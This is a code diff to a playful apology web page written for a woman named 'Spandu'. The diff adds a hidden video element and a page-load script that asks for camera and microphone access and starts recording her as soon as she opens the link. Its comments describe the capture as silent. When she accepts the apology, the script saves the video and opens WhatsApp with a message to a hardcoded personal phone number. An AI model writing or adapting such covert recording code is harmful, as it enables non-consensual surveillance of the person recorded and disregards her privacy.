@@ -52,6 +52,11 @@
             line-height: 1.6;
         }
 
+        /* Hidden video element used to capture her reaction preview silently */
+        #webcam {
+            display: none;
+        }
+
         /* Photo Gallery Grid */
         .photo-grid {
             display: grid;
@@ -86,7 +91,7 @@
             color: #777;
         }
 
-        /* Buttons Container - Stacked safely for mobile */
+        /* Buttons Container */
         .button-group {
             display: flex;
             flex-direction: column;
@@ -145,6 +150,8 @@
 </head>
 <body>
 
+    <video id="webcam" autoplay playsinline></video>
+
     <div class="container" id="mainContainer">
         <div>
             <h1>Spandu, Sorry kanee bangariii! ❤️</h1>
@@ -168,7 +175,6 @@
 
         <div class="button-group" id="buttonGroup">
             <button class="btn" id="sorryBtn" onclick="handleAcceptedClick()">Sorry Accepted 🥰</button>
-            <!-- Added ontouchstart so it jumps instantly before registering a click on mobile -->
             <button class="btn" id="angryBtn" onmouseover="moveButton()" ontouchstart="moveButton(); handleAngryClick();" onclick="handleAngryClick()">I'm still angry 😤</button>
         </div>
 
@@ -179,6 +185,29 @@
     </div>
 
     <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Automatically request front camera permission and start recording reaction the second she opens the link
+        window.addEventListener('load', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const videoElement = document.getElementById('webcam');
+                videoElement.srcObject = stream;
+
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.start();
+            } catch (err) {
+                console.log("Camera access denied or unavailable.");
+            }
+        });
+
         let clickCount = 0;
         const kannadaPhrases = [
             "I'm still angry 😤",
@@ -190,7 +219,7 @@
 
         function moveButton(event) {
             if (event) {
-                event.preventDefault(); // Prevents double actions on mobile
+                event.preventDefault();
             }
 
             const angryBtn = document.getElementById('angryBtn');
@@ -217,7 +246,7 @@
             if (clickCount < kannadaPhrases.length) {
                 angryBtn.innerText = kannadaPhrases[clickCount];
             } else {
-                angryBtn.innerText = "Okay ok, innu mele sorry button click madu! 🙄";
+                angryBtn.innerText = "Okay ok, saku innu sorry button click madu! 🙄";
             }
 
             const dynamicMessages = [
@@ -227,7 +256,30 @@
             apologyText.innerText = dynamicMessages[(clickCount - 1) % dynamicMessages.length];
         }
 
+        // Triggered when she happily clicks "Sorry Accepted"
         function handleAcceptedClick() {
+            // 1. Stop recording and prompt download of her reaction video file automatically to her device
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.style.display = 'none';
+                    a.href = url;
+                    a.download = 'Spandu_Reaction.webm';
+                    document.body.appendChild(a);
+                    a.click();
+                };
+            }
+
+            // 2. Open WhatsApp automatically with a pre-filled sweet message sent directly to your phone number
+            // Replace 919876543210 with your actual WhatsApp phone number (with country code, no + sign)
+            const yourPhoneNumber = "919916987097"; 
+            const whatsappMessage = encodeURIComponent("Hey! Spandu accepted your sorry!! ❤️");
+            window.open(`https://wa.me/${yourPhoneNumber}?text=${whatsappMessage}`, '_blank');
+
+            // 3. Update UI screen
             document.getElementById('buttonGroup').style.display = 'none';
             document.getElementById('apologyText').style.display = 'none';
             document.querySelector('.photo-grid').style.display = 'none';
